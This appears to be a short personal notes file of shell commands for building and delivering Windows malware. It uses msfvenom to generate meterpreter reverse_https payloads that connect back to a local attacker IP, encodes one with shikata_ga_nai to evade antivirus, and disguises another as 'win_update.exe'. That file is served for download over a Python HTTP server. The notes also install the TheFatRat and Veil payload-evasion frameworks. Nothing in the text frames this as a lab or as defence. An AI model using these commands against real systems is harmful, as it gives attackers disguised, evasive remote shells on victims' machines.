msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.105 LPORT=443 -f exe -o ~/payload.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.105 LPORT=443 -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.105 LPORT=443 -f exe -o ~/win_update.exe


python3 -m http.server 8080

http://192.168.1.105:8080/win_update.exe


git clone https://github.com/Screetsec/TheFatRat.git
cd TheFatRat
chmod +x setup.sh
sudo ./setup.sh

sudo ./fatrat

cd ~
git clone https://github.com/Veil-Framework/Veil.git
cd Veil
sudo ./config/setup.sh --force

sudo veil

sudo ln -s /home/ray_king11/Veil/Veil.py /usr/local/bin/veil


sudo dpkg --add-architecture i386
sudo mkdir -pm755 /etc/apt/keyrings
sudo wget -O /etc/apt/keyrings/winehq-archive.key https://dl.winehq.org/wine-builds/winehq.key


sudo wget -NP /etc/apt/sources.list.d/ https://dl.winehq.org/wine-builds/debian/dists/bookworm/winehq-bookworm.sources

sudo apt update

sudo apt install --install-recommends winehq-stable -y






